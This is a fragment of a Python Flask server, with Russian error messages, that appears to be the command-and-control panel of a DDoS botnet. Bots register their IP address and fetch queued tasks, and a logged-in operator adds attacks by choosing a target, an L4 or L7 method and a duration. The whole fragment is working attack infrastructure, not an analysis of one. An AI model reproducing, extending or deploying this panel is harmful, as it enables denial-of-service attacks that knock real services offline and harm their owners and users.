





@app.route("/RegistrBot")
def RegistrBot():
	if (request.remote_addr in bots) != True:
		bots.append(request.remote_addr)
	return ""

@app.route("/GetTask")
def getTask():
	if (request.remote_addr in bots) != True:
		bots.append(request.remote_addr)
	return json.dumps(tasks)


@app.route("/AddTask", methods=["POST"])
def addTask():
	if "user" in session:
		Err, form = [], request.form
		forms = {"target":"Пустое поле Target.", "method":"Пустое поле Method.", "timess":"Пустое поле Time."}
		for i in list(forms.keys()):
			stats = isForm(form, i) 
			if stats == False: Err.append(forms[i])
			if stats != False and form[i] == "": Err.append(forms[i])
			if stats != False and methods[form["method"]] == "l4" and (("https://" or "http://") in form["target"]) != False:
				Err.append("Этот Target для L7")
			if stats != False and methods[form["method"]] == "l4": 
				try:
					print(32243)
					addr, port = form["target"].split(":")[0], int(form["target"].split(":")[1])
					socket.inet_aton(addr)
				except: Err.append("Неверный Target")
				try: int(form["timess"])
				except: Err.append("Неверно указано поле Time")

		try: assert form["method"] in list(methods.keys())
		except: Err.append("Метода не существует")
		
		if len(Err) != 0: 
			return f"{Err[0]}<br><br><a href=\"/home\">Назад</a>"
		else:
			key = str(random.getrandbits(30))
			tasks[key] = {"status":"_","target":form["target"],"time":form["timess"], "type":form["method"].lower(), "id":key}
			threading.Thread(target=check, args=(form["timess"], key)).start()
			return redirect("/home")
	else:
		return redirect("/login")

@app.route("/DelTask/<string:targets>")
def delTask(targets):
	try:tasks.pop(targets)
	except:pass
	return redirect("/home")

